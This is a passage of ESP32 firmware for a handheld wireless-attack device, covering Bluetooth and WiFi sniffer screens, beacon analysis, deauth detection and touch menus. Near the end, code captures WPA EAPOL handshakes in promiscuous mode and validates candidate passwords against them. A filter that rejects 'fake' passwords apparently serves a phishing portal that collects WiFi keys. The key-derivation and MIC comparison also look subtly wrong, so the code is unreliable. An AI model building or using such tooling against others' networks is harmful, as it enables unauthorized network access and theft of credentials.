      frame->description += ":" + deviceType;
    }
    
    btClassicFrameIndex++;
    btClassicFrameCount++;
  }
};

void startBTClassicSniffer() {
  btClassicSnifferActive = true;
  btClassicFrameCount = 0;
  btInquiryCount = 0;
  btPageCount = 0;
  btConnectionCount = 0;
  btClassicScrollOffset = 0;
  btClassicFrameIndex = 0;
  
  // Stop conflicting operations
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24 for Classic BT...");
    nrfJammerActive = false;
    delay(100);
  }
  
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(200);
  }
  
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new BTClassicSnifferCallback());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  
  addToConsole("Classic BT sniffer started");
  Serial.println("[+] Classic Bluetooth Sniffer started");
  Serial.println("    Note: ESP32 limitation - uses BLE scan");
  Serial.println("    to detect Classic BT devices nearby");
  
  displayBTClassicSniffer();
  
  pBLEScan->start(0, nullptr, false);
}

void stopBTClassicSniffer() {
  btClassicSnifferActive = false;
  
  if (pBLEScan != nullptr) {
    pBLEScan->stop();
  }
  
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(false);
    delay(200);
  }
  
  Serial.printf("[+] Classic BT sniffer stopped - %d frames captured\n", btClassicFrameCount);
  addToConsole("Classic BT sniffer stopped");
}

void displayBTClassicSniffer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("classic bt sniffer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_PURPLE : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Total:%d", btClassicFrameCount);
  
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(75, statsY);
  tft.printf("INQ:%d", btInquiryCount);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(130, statsY);
  tft.printf("PG:%d", btPageCount);
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(180, statsY);
  tft.printf("CN:%d", btConnectionCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TY");
  tft.setCursor(30, listY);
  tft.print("ADDRESS");
  tft.setCursor(100, listY);
  tft.print("DEVICE");
  tft.setCursor(165, listY);
  tft.print("RSSI");
  tft.setCursor(205, listY);
  tft.print("CH");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  const int FOOTER_Y = 270;
  const int ITEM_HEIGHT = 30;
  const int MAX_ITEMS = (FOOTER_Y - listY) / ITEM_HEIGHT;
  
  if (btClassicFrameCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("Scanning for Classic BT...");
    
    tft.setCursor(SIDE_MARGIN, listY + 55);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print("Headsets, speakers, cars");
  } else {
    int totalFrames = min(btClassicFrameIndex, MAX_BT_CLASSIC_FRAMES);
    
    if (btClassicScrollOffset >= totalFrames) {
      btClassicScrollOffset = max(0, totalFrames - MAX_ITEMS);
    }
    if (btClassicScrollOffset < 0) {
      btClassicScrollOffset = 0;
    }
    
    int displayCount = min(totalFrames - btClassicScrollOffset, MAX_ITEMS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = (btClassicFrameIndex - totalFrames + btClassicScrollOffset + i + MAX_BT_CLASSIC_FRAMES) % MAX_BT_CLASSIC_FRAMES;
      int y = listY + (i * ITEM_HEIGHT);
      
      if (y + ITEM_HEIGHT > FOOTER_Y) break;
      
      BTClassicFrame* frame = &btClassicFrames[idx];
      
      // Type (color coded)
      uint16_t typeColor = COLOR_TEXT;
      if (frame->type == 0) typeColor = COLOR_GREEN;       // Inquiry
      else if (frame->type == 1) typeColor = COLOR_YELLOW; // Page
      else if (frame->type == 2) typeColor = COLOR_CYAN;   // Connection
      
      tft.setTextColor(typeColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y + 2);
      
      String typeStr = "";
      if (frame->type == 0) typeStr = "IQ";
      else if (frame->type == 1) typeStr = "PG";
      else if (frame->type == 2) typeStr = "CN";
      tft.print(typeStr);
      
      // Address (last 3 octets)
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(30, y + 2);
      tft.printf("%02X:%02X:%02X", frame->addr[3], frame->addr[4], frame->addr[5]);
      
      // Device name/type
      tft.setTextColor(COLOR_PURPLE);
      tft.setCursor(100, y + 2);
      String devType = frame->deviceName;
      if (devType.length() > 9) devType = devType.substring(0, 8) + "~";
      tft.print(devType);
      
      // RSSI
      tft.setTextColor(frame->rssi > -60 ? COLOR_GREEN : COLOR_YELLOW);
      tft.setCursor(165, y + 2);
      tft.printf("%3d", frame->rssi);
      
      // Channel
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(205, y + 2);
      tft.printf("%2d", frame->channel);
      
      // Full address on second line
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN, y + 12);
      tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                 frame->addr[0], frame->addr[1], frame->addr[2],
                 frame->addr[3], frame->addr[4], frame->addr[5]);
      
      // Time ago
      unsigned long ago = (millis() - frame->timestamp) / 1000;
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN, y + 22);
      if (ago < 60) {
        tft.printf("%2ds ago", ago);
      } else if (ago < 3600) {
        tft.printf("%2dm ago", ago / 60);
      } else {
        tft.printf("%2dh ago", ago / 3600);
      }
    }
    
    if (totalFrames > MAX_ITEMS) {
      int scrollY = FOOTER_Y + 2;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      
      int currentPage = (btClassicScrollOffset / MAX_ITEMS) + 1;
      int totalPages = (totalFrames + MAX_ITEMS - 1) / MAX_ITEMS;
      char scrollText[30];
      sprintf(scrollText, "Page %d/%d [Tap]", currentPage, totalPages);
      int textWidth = strlen(scrollText) * 6;
      int centerX = (240 - textWidth) / 2;
      
      tft.setCursor(centerX, scrollY);
      tft.print(scrollText);
    }
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}



// ==================== DRAW BLE SNIFFER SUBMENU (NEW) ====================
void drawBLESnifferSubmenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("bluetooth sniffers");
  
  const char* menuItems[] = {
    "BLE Frame Sniffer",
    "Classic Frame Sniffer" 
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 2; i++) {  // ← Changed from 1 to 2
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Info
  y += MENU_ITEM_HEIGHT + MENU_SPACING + 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Bluetooth Analysis:");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("BLE: Low Energy packets");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Classic: Traditional BT");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- Inquiry/Page frames");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- Connection events");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("- Device discovery");
  
  y += 20;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Auto-identifies:");
  
  y += 12;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Headsets, speakers, cars");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

// ==================== DISPLAY BEACON ANALYZER ====================
void displayBeaconAnalyzer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("beacon analyzer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_ORANGE : COLOR_DARK_GREEN);
  
  // Stats bar
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch%d", snifferChannel);
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(50, statsY);
  tft.printf("APs:%d", beaconCount);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(120, statsY);
  tft.printf("Beacons:%d", totalBeacons);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("SSID");
  tft.setCursor(90, listY);
  tft.print("CH");
  tft.setCursor(115, listY);
  tft.print("ENC");
  tft.setCursor(150, listY);
  tft.print("WPS");
  tft.setCursor(180, listY);
  tft.print("VENDOR");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate display area
  const int FOOTER_Y = 270;
  const int ITEM_HEIGHT = 32;
  const int MAX_ITEMS = (FOOTER_Y - listY) / ITEM_HEIGHT;
  
  if(beaconCount == 0) {
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, listY + 40);
  tft.print("Scanning for beacons...");
  tft.setCursor(SIDE_MARGIN, listY + 55);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.print("Tap beacon for details");
  } else {
  int displayCount = min((int)(beaconCount - beaconScrollOffset), MAX_ITEMS);

  for (int i = 0; i < displayCount; i++) {
  int idx = beaconScrollOffset + i;
  int y = listY + (i * ITEM_HEIGHT);
  
  BeaconInfo* beacon = &beacons[idx];
  
  // Highlight if selected
  if (selectedBeaconIndex == idx) {
    tft.fillRect(0, y - 2, 240, ITEM_HEIGHT, COLOR_SELECTED_BG);
  }
  
  // SSID
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(1);
  tft.setCursor(SIDE_MARGIN, y + 2);
  String displaySSID = beacon->ssid.length() > 0 ? beacon->ssid : "<hidden>";
  if (displaySSID.length() > 11) displaySSID = displaySSID.substring(0, 10) + "~";
  tft.print(displaySSID);
  
  // Channel
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(90, y + 2);
  tft.printf("%2d", beacon->channel);
  
  // Encryption
  uint16_t encColor = COLOR_GREEN;
  const char* encText = "OPEN";
  if (beacon->encryptionType == 1) {
    encColor = COLOR_YELLOW;
    encText = "WPA";
  } else if (beacon->encryptionType == 2) {
    encColor = COLOR_ORANGE;
    encText = "WPA2";
  }
  tft.setTextColor(encColor);
  tft.setCursor(115, y + 2);
  tft.print(encText);
  
  // WPS
  tft.setTextColor(beacon->wpsEnabled ? COLOR_RED : COLOR_GREEN);
  tft.setCursor(150, y + 2);
  tft.print(beacon->wpsEnabled ? "YES" : "NO");
  
  // Vendor
  tft.setTextColor(COLOR_PURPLE);
  tft.setCursor(180, y + 2);
  String vendorShort = beacon->vendor;
  if (vendorShort.length() > 7) vendorShort = vendorShort.substring(0, 6) + "~";
    tft.print(vendorShort);
    
    // BSSID on second line
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y + 12);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
              beacon->bssid[0], beacon->bssid[1], beacon->bssid[2],
              beacon->bssid[3], beacon->bssid[4], beacon->bssid[5]);
    
    // RSSI and beacon count
    tft.setTextColor(beacon->rssi > -50 ? COLOR_GREEN : COLOR_YELLOW);
    tft.setCursor(SIDE_MARGIN, y + 22);
    tft.printf("%ddBm", beacon->rssi);
    
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(75, y + 22);
    tft.printf("Seen:%d", beacon->beaconCount);
  }

  // Scroll indicator
  if (beaconCount > MAX_ITEMS) {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(70, FOOTER_Y);
    int currentPage = (beaconScrollOffset / MAX_ITEMS) + 1;
    int totalPages = (beaconCount + MAX_ITEMS - 1) / MAX_ITEMS;
    tft.printf("Page %d/%d [Tap]", currentPage, totalPages);
  }
  }
  drawCenteredButton("[STOP]", COLOR_RED, 305);
}

// ==================== PROBE REQUEST SNIFFER TOUCH ====================
void handleProbeRequestSnifferTouch(int x, int y) {
  if (y > 300) {
    stopProbeRequestSniffer();
    currentState = WIFI_SNIFFER_SUBMENU;  // ← CHANGED
    hoveredIndex = -1;
    drawWiFiSnifferSubmenu();              // ← CHANGED
    return;
  }
  
  // Scroll through probes
  if (probeRequestCount > 0 && y > HEADER_HEIGHT + 40 && y < 270) {
    const int MAX_ITEMS = 9;
    int totalPages = (probeRequestCount + MAX_ITEMS - 1) / MAX_ITEMS;
    
    if (totalPages > 1) {
      int currentPage = probeScrollOffset / MAX_ITEMS;
      currentPage = (currentPage + 1) % totalPages;
      probeScrollOffset = currentPage * MAX_ITEMS;
      displayProbeRequestSniffer();
    }
  }
}

// ==================== MANAGEMENT FRAME SNIFFER TOUCH ====================
void handleManagementFrameSnifferTouch(int x, int y) {
  if (y > 300) {
    stopManagementFrameSniffer();
    currentState = FRAME_SNIFFER_SUBMENU;  // ← CHANGED
    hoveredIndex = -1;
    drawFrameSnifferSubmenu();              // ← CHANGED
    return;
  }
  
  // Scroll through frames
  if (mgmtFrameCount > 0 && y > HEADER_HEIGHT + 40 && y < 270) {
    const int MAX_ITEMS = 10;
    int totalPages = (mgmtFrameCount + MAX_ITEMS - 1) / MAX_ITEMS;
    
    if (totalPages > 1) {
      int currentPage = mgmtScrollOffset / MAX_ITEMS;
      currentPage = (currentPage + 1) % totalPages;
      mgmtScrollOffset = currentPage * MAX_ITEMS;
      displayManagementFrameSniffer();
    }
  }
}

// ==================== BEACON ANALYZER TOUCH ====================
void handleBeaconAnalyzerTouch(int x, int y) {
  if (y > 300) {
    stopBeaconAnalyzer();
    currentState = WIFI_SNIFFER_SUBMENU;  // ← CHANGED
    hoveredIndex = -1;
    drawWiFiSnifferSubmenu();              // ← CHANGED
    return;
  }
  
  // Tap to select beacon and print details
  int listY = HEADER_HEIGHT + 37;
  const int ITEM_HEIGHT = 32;
  const int MAX_ITEMS = 7;
  
  if (beaconCount > 0 && y >= listY && y < (listY + MAX_ITEMS * ITEM_HEIGHT)) {
    int clickedIndex = (y - listY) / ITEM_HEIGHT;
    int actualIndex = beaconScrollOffset + clickedIndex;
    
    if (actualIndex >= 0 && actualIndex < beaconCount) {
      selectedBeaconIndex = actualIndex;
      displayBeaconAnalyzer();
      
      // Print full details to serial
      BeaconInfo* beacon = &beacons[actualIndex];
      
      Serial.println("\n========================================");
      Serial.println("[*] SELECTED BEACON DETAILS");
      Serial.println("========================================");
      Serial.printf("SSID: %s\n", beacon->ssid.length() > 0 ? beacon->ssid.c_str() : "<hidden>");
      Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    beacon->bssid[0], beacon->bssid[1], beacon->bssid[2],
                    beacon->bssid[3], beacon->bssid[4], beacon->bssid[5]);
      Serial.printf("Channel: %d\n", beacon->channel);
      Serial.printf("RSSI: %d dBm\n", beacon->rssi);
      
      const char* encType = "OPEN";
      if (beacon->encryptionType == 1) encType = "WPA";
      else if (beacon->encryptionType == 2) encType = "WPA2";
      Serial.printf("Encryption: %s\n", encType);
      
      Serial.printf("Vendor: %s\n", beacon->vendor.c_str());
      Serial.printf("Beacon Interval: %d ms\n", beacon->beaconInterval);
      Serial.printf("WPS: %s ", beacon->wpsEnabled ? "YES" : "NO");
      if (beacon->wpsEnabled) {
        Serial.println("(⚠️ VULNERABLE)");
      } else {
        Serial.println("(Secure)");
      }
      Serial.printf("WMM: %s\n", beacon->wmmEnabled ? "YES" : "NO");
      
      // Supported rates
      if (beacon->numRates > 0) {
        Serial.print("Supported Rates: ");
        for (int i = 0; i < beacon->numRates; i++) {
          int rate = (beacon->supportedRates[i] & 0x7F) * 0.5;
          Serial.printf("%d%s", rate, i < beacon->numRates - 1 ? "," : " Mbps\n");
        }
      }
      
      Serial.printf("Beacons Seen: %d\n", beacon->beaconCount);
      Serial.printf("First Seen: %lu ms ago\n", millis() - beacon->firstSeen);
      Serial.printf("Last Seen: %lu ms ago\n", millis() - beacon->lastSeen);
      Serial.println("========================================\n");
    }
  }
  
  // Scroll through beacons
  if (beaconCount > MAX_ITEMS && y >= listY && y < 270) {
    int totalPages = (beaconCount + MAX_ITEMS - 1) / MAX_ITEMS;
    int currentPage = beaconScrollOffset / MAX_ITEMS;
    currentPage = (currentPage + 1) % totalPages;
    beaconScrollOffset = currentPage * MAX_ITEMS;
    displayBeaconAnalyzer();
  }
}

void handleSnifferMenuTouch(int x, int y) {
  if (y > 300) {
    currentState = MAIN_MENU;
    hoveredIndex = -1;
    drawMainMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (2 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // WiFi Sniffers
          currentState = WIFI_SNIFFER_SUBMENU;
          hoveredIndex = -1;
          drawWiFiSnifferSubmenu();
          break;
        case 1: // Bluetooth Sniffers
          currentState = BLE_SNIFFER_SUBMENU;
          hoveredIndex = -1;
          drawBLESnifferSubmenu();
          break;
      }
    }
  }
}

void handleWiFiSnifferSubmenuTouch(int x, int y) {
  if (y > 300) {
    currentState = SNIFFER_MENU;
    hoveredIndex = -1;
    drawSnifferMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // ← Only 3 items now
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // Frame Sniffer → Go to Frame Submenu
          currentState = FRAME_SNIFFER_SUBMENU;
          hoveredIndex = -1;
          drawFrameSnifferSubmenu();
          break;
          
        case 1: // Probe Request Sniffer
          currentState = PROBE_SNIFFER_ACTIVE;
          startProbeRequestSniffer();
          break;
          
        case 2: // Beacon Analyzer
          currentState = BEACON_ANALYZER_ACTIVE;
          startBeaconAnalyzer();
          break;
      }
    }
  }
}

void handleFrameSnifferSubmenuTouch(int x, int y) {
  if (y > 300) {
    // Back to WiFi Sniffer menu
    currentState = WIFI_SNIFFER_SUBMENU;
    hoveredIndex = -1;
    drawWiFiSnifferSubmenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (4 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // All Frames
          currentState = SNIFFER_ACTIVE;
          snifferScrollOffset = 0;
          packetHistoryIndex = 0;
          startSniffer();
          break;
          
        case 1: // Management Frames
          currentState = MGMT_SNIFFER_ACTIVE;
          startManagementFrameSniffer();
          break;
          
        case 2: // Control Frames
          currentState = CONTROL_SNIFFER_ACTIVE;
          startControlFrameSniffer();
          break;
          
        case 3: // Data Frames
          currentState = DATA_SNIFFER_ACTIVE;
          startDataFrameSniffer();
          break;
      }
    }
  }
}

void handleControlSnifferTouch(int x, int y) {
  if (y > 300) {
    stopControlFrameSniffer();
    currentState = FRAME_SNIFFER_SUBMENU; 
    hoveredIndex = -1;
    drawFrameSnifferSubmenu();
    return;
  }
  
  // Scroll through control frames
  if (controlFrameCount > 0 && y > HEADER_HEIGHT + 40 && y < 270) {
    const int MAX_ITEMS = 11;
    int totalPages = (controlFrameCount + MAX_ITEMS - 1) / MAX_ITEMS;
    
    if (totalPages > 1) {
      int currentPage = controlScrollOffset / MAX_ITEMS;
      currentPage = (currentPage + 1) % totalPages;
      controlScrollOffset = currentPage * MAX_ITEMS;
      displayControlFrameSniffer();
    }
  }
}

void handleDataSnifferTouch(int x, int y) {
  if (y > 300) {
    stopDataFrameSniffer();
    currentState = FRAME_SNIFFER_SUBMENU;
    hoveredIndex = -1;
    drawFrameSnifferSubmenu(); 
    return;
  }
  
  // Scroll through data frames
  if (dataFrameCount > 0 && y > HEADER_HEIGHT + 40 && y < 270) {
    const int MAX_ITEMS = 11;
    int totalPages = (dataFrameCount + MAX_ITEMS - 1) / MAX_ITEMS;
    
    if (totalPages > 1) {
      int currentPage = dataScrollOffset / MAX_ITEMS;
      currentPage = (currentPage + 1) % totalPages;
      dataScrollOffset = currentPage * MAX_ITEMS;
      displayDataFrameSniffer();
    }
  }
}



// ==================== HANDLE BLE SNIFFER SUBMENU TOUCH (NEW) ====================
void handleBLESnifferSubmenuTouch(int x, int y) {
  if (y > 300) {
    currentState = SNIFFER_MENU;
    hoveredIndex = -1;
    drawSnifferMenu();
    return;
  }
  
  int startY = HEADER_HEIGHT + 10;
  
  if (y >= startY && y < startY + (2 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {  // ← Changed to 2
    int relativeY = y - startY;
    int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
    
    int buttonY = startY + (buttonIndex * (MENU_ITEM_HEIGHT + MENU_SPACING));
    if (y >= buttonY && y <= buttonY + MENU_ITEM_HEIGHT) {
      switch (buttonIndex) {
        case 0: // BLE Frame Sniffer
          currentState = BLE_SNIFFER_ACTIVE;
          startBLEFrameSniffer();
          break;
        case 1: // Classic BT Sniffer (NEW)
          currentState = BT_CLASSIC_SNIFFER_ACTIVE;
          startBTClassicSniffer();
          break;
      }
    }
  }
}

void handleBTClassicSnifferTouch(int x, int y) {
  if (y > 300) {
    // Stop button pressed
    stopBTClassicSniffer();
    currentState = BLE_SNIFFER_SUBMENU;
    hoveredIndex = -1;
    drawBLESnifferSubmenu();
    return;
  }
  
  // Scroll through frames
  if (btClassicFrameCount > 0 && y > HEADER_HEIGHT + 40 && y < 280) {
    const int MAX_ITEMS = 9;
    int totalFrames = min(btClassicFrameIndex, MAX_BT_CLASSIC_FRAMES);
    int totalPages = (totalFrames + MAX_ITEMS - 1) / MAX_ITEMS;
    
    if (totalPages > 1) {
      int currentPage = btClassicScrollOffset / MAX_ITEMS;
      currentPage = (currentPage + 1) % totalPages;
      btClassicScrollOffset = currentPage * MAX_ITEMS;
      displayBTClassicSniffer();
    }
  }
}

// ==================== CAPTURE HANDSHAKE FROM SNIFFER ====================
void IRAM_ATTR wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  
  packetCount++;
  uint8_t frameType = pkt->payload[0];
  
  // CRITICAL: Only essential processing in interrupt context
  // No Serial.println() - causes crashes!
  
  // === DEAUTH DETECTION (NEW) ===
  if (deauthSnifferActive && (frameType == 0xC0 || frameType == 0xA0)) {
    // Deauth or Disassociation frame detected
    if (deauthEventCount < 50) {
      DeauthEvent* event = &deauthEvents[deauthEventCount];
      
      // Extract source MAC (sender of deauth)
      memcpy(event->sourceMAC, &pkt->payload[10], 6);
      
      // Extract target MAC (receiver)
      memcpy(event->targetMAC, &pkt->payload[4], 6);
      
      event->rssi = pkt->rx_ctrl.rssi;
      event->channel = pkt->rx_ctrl.channel;
      event->timestamp = millis();
      
      deauthEventCount++;
      detectedDeauths++;
    }
  }
  
  // Detect EAPOL frames (WPA handshake) - FAST check only
  if (type == WIFI_PKT_MISC && pkt->rx_ctrl.sig_len > 100) {
    if (pkt->payload[30] == 0x88 && pkt->payload[31] == 0x8E) {
      uint8_t keyInfo = pkt->payload[37];
      
      if ((keyInfo & 0x08) && (keyInfo & 0x01)) {
        // Extract only critical data
        memcpy(capturedHandshake.clientMAC, &pkt->payload[4], 6);
        memcpy(capturedHandshake.apMAC, &pkt->payload[10], 6);
        
        if (!(keyInfo & 0x40)) {
          memcpy(capturedHandshake.anonce, &pkt->payload[51], 32);
        }
        
        if (keyInfo & 0x40) {
          memcpy(capturedHandshake.snonce, &pkt->payload[51], 32);
          memcpy(capturedHandshake.mic, &pkt->payload[85], 16);
          capturedHandshake.captured = true;
        }
      }
    }
  }
  
  // Fast packet type counting
  if (frameType == 0x80) {
    beaconCount++;
  }
  else if ((frameType & 0x0C) == 0x08) {
    dataCount++;
  }
  else if (frameType == 0xC0 || frameType == 0xA0) {
    deauthCount++;
  }
  
  // Store minimal packet info
  packetHistory[packetHistoryIndex].type = frameType;
  packetHistory[packetHistoryIndex].rssi = pkt->rx_ctrl.rssi;
  packetHistory[packetHistoryIndex].channel = pkt->rx_ctrl.channel;
  packetHistory[packetHistoryIndex].timestamp = millis();
  packetHistoryIndex = (packetHistoryIndex + 1) % MAX_SNIFFER_PACKETS;
}

struct PasswordValidationTask {
  String password;
  String ssid;
  bool* result;
  bool* completed;
};

// ==================== VALIDATE PASSWORD AGAINST HANDSHAKE ====================
void validatePasswordTask(void* parameter) {
  PasswordValidationTask* params = (PasswordValidationTask*)parameter;
  
  Serial.println("[*] Validating password in background task...");
  
  if (!capturedHandshake.captured) {
    Serial.println("[-] No handshake captured yet");
    *(params->result) = false;
    *(params->completed) = true;
    vTaskDelete(NULL);
    return;
  }
  
  // Step 1: Calculate PMK
  uint8_t pmk[32];
  
  mbedtls_md_context_t ctx;
  mbedtls_md_init(&ctx);
  mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
  
  // This is the slow part (2-3 seconds)
  mbedtls_pkcs5_pbkdf2_hmac(
    &ctx,
    (const unsigned char*)params->password.c_str(), params->password.length(),
    (const unsigned char*)params->ssid.c_str(), params->ssid.length(),
    4096,
    32,
    pmk
  );
  
  mbedtls_md_free(&ctx);
  
  // Step 2: Calculate PTK
  uint8_t ptk[64];
  uint8_t ptkData[100];
  int pos = 0;
  
  memcpy(&ptkData[pos], "Pairwise key expansion", 23);
  pos += 23;
  
  if (memcmp(capturedHandshake.apMAC, capturedHandshake.clientMAC, 6) < 0) {
    memcpy(&ptkData[pos], capturedHandshake.apMAC, 6); pos += 6;
    memcpy(&ptkData[pos], capturedHandshake.clientMAC, 6); pos += 6;
  } else {
    memcpy(&ptkData[pos], capturedHandshake.clientMAC, 6); pos += 6;
    memcpy(&ptkData[pos], capturedHandshake.apMAC, 6); pos += 6;
  }
  
  if (memcmp(capturedHandshake.anonce, capturedHandshake.snonce, 32) < 0) {
    memcpy(&ptkData[pos], capturedHandshake.anonce, 32); pos += 32;
    memcpy(&ptkData[pos], capturedHandshake.snonce, 32); pos += 32;
  } else {
    memcpy(&ptkData[pos], capturedHandshake.snonce, 32); pos += 32;
    memcpy(&ptkData[pos], capturedHandshake.anonce, 32); pos += 32;
  }
  
  mbedtls_md_hmac(
    mbedtls_md_info_from_type(MBEDTLS_MD_SHA1),
    pmk, 32,
    ptkData, pos,
    ptk
  );
  
  // Step 3: Compare MIC
  uint8_t calculatedMIC[16];
  memcpy(calculatedMIC, ptk, 16);
  
  bool matches = (memcmp(calculatedMIC, capturedHandshake.mic, 16) == 0);
  
  Serial.printf("[%s] Password validation: %s\n", 
                matches ? "+" : "-", 
                matches ? "CORRECT!" : "INCORRECT");
  
  *(params->result) = matches;
  *(params->completed) = true;
  
  vTaskDelete(NULL);
}

bool validatePasswordWithHandshake(String password, String ssid) {
  if (!capturedHandshake.captured) {
    Serial.println("[-] No handshake captured yet");
    return false;
  }
  
  // ✅ Quick validation first
  if (password.length() < 8 || password.length() > 63) {
    return false;
  }
  
  static bool validationResult = false;
  static bool validationCompleted = false;
  
  PasswordValidationTask params;
  params.password = password;
  params.ssid = ssid;
  params.result = &validationResult;
  params.completed = &validationCompleted;
  
  validationCompleted = false;
  
  // Start validation task
  xTaskCreate(
    validatePasswordTask,
    "pwd_validate",
    8192,
    &params,
    1,
    NULL
  );
  
  // Wait for completion (with timeout)
  unsigned long startTime = millis();
  while (!validationCompleted && (millis() - startTime < 10000)) {
    esp_task_wdt_reset();
    delay(100);
  }
  
  if (!validationCompleted) {
    Serial.println("[!] Validation timeout");
    return false;
  }
  
  return validationResult;
}

bool validateWiFiPassword(String password) {
  int len = password.length();
  
  // WPA/WPA2 passwords must be 8-63 characters
  if (len < 8 || len > 63) {
    return false;
  }
  
  // Check for common patterns that suggest fake/weak passwords
  String lower = password;
  lower.toLowerCase();
  
  // Too simple patterns (likely fake)
  if (lower == "12345678" || lower == "password" || 
      lower == "qwertyui" || lower == "11111111") {
    return false;
  }
  
  // All same character (likely fake)
  bool allSame = true;
  char first = password.charAt(0);
